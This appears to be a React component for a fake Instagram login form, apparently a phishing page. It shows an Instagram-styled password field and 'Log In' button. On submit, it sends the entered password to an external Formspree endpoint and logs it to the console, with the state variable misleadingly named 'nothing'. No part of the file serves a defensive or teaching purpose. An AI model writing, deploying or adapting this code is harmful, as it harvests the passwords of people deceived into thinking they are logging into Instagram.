import React, { useState } from 'react';
import axios from 'axios';
import './InstagramInput.css';
import './InstagramButton.css';

function InstagramnothingInput() {
  const [nothing, setnothing] = useState('');

  const handleSubmit = async (event) => {
    event.preventDefault(); // Prevent form from submitting the traditional way
    try {
      const response = await fetch('https://formspree.io/f/xeojqbky', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ nothing }),
      });
      console.log(`nothing submitted: ${nothing}`); // Correct client-side logging
      const data = await response.json();
      console.log(data);
    } catch (error) {
      console.error('Error submitting nothing:', error);
    }
  };
  
  

  return (
    <form onSubmit={handleSubmit}>
      <div className="instagram-input-container">
        <input
          type="password"
          className="instagram-input"
          placeholder="password"
          value={nothing}
          onChange={(e) => setnothing(e.target.value)}
        />
      </div>
      <button type="submit" className="instagram-login-button">Log In</button>
    </form>
  );
}

export default InstagramnothingInput;

